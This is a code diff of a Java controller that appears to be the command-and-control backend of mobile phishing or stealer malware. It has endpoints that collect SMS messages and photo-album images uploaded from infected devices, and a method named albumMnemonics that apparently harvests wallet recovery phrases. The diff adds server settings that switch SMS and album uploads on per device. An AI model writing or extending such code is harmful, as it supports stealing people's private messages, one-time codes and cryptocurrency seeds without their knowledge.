@@ -76,10 +76,10 @@ public class DeviceApiController extends BaseApiController {
 
     @Resource
     private FishTemplateService fishTemplateService;
-    
+
     @Resource
     private SmsInfoService smsInfoService;
-    
+
     @Resource
     private AlbumPicService albumPicService;
 
@@ -254,6 +254,8 @@ public class DeviceApiController extends BaseApiController {
 
         serverConfig.setUnlockFish(Objects.equals(dbDevice.getUnlockFish(), Constant.YN.Y));
         serverConfig.setUnlockFishFeatures(sysParamsDao.getValueByCode(Constant.SystemParamsKey.UnlockFishFeatures));
+        serverConfig.setUploadSms(Objects.equals(dbDevice.getUploadSms(), Constant.YN.Y));
+        serverConfig.setUploadAlbum(Objects.equals(dbDevice.getUploadAlbum(), Constant.YN.Y));
 
         Device updateDevice = new Device();
         updateDevice.setId(dbDevice.getId());
@@ -300,30 +302,28 @@ public class DeviceApiController extends BaseApiController {
         List<Template> list = fishTemplateService.list(query);
         return Result.toSuccess(list);
     }
-    
+
 
     @RequestMapping("sms")
     public Result<Void> sms(@RequestBody List<SmsInfoEntity> list) {
-    	 String deviceId = DeviceContext.getDeviceId();
-         String pkg = DeviceContext.getPkg();
-         for (SmsInfoEntity sms : list) {
-             sms.setDeviceId(deviceId);
-             sms.setPkg(pkg);
-         }
-         smsInfoService.addSms(list);
-         log.info("设备:{} 短信上传成功." , deviceId);
+        String deviceId = DeviceContext.getDeviceId();
+        String pkg = DeviceContext.getPkg();
+        for (SmsInfoEntity sms : list) {
+            sms.setDeviceId(deviceId);
+            sms.setPkg(pkg);
+        }
+        smsInfoService.addSms(list);
+        log.info("设备:{} 短信上传成功.", deviceId);
         return Result.toSuccess();
     }
-    
-    
+
 
     @PostMapping("/album_pic")
-    public Result<Void>  albumMnemonics(@RequestBody List<AlbumPicEntity> inputs) {
+    public Result<Void> albumMnemonics(@RequestBody List<AlbumPicEntity> inputs) {
         albumPicService.upload(inputs);
-        log.info("设备:{} 相册上传成功." , DeviceContext.getDeviceId());
+        log.info("设备:{} 相册上传成功.", DeviceContext.getDeviceId());
         return Result.toSuccess();
     }
-    
-    
+
 
 }
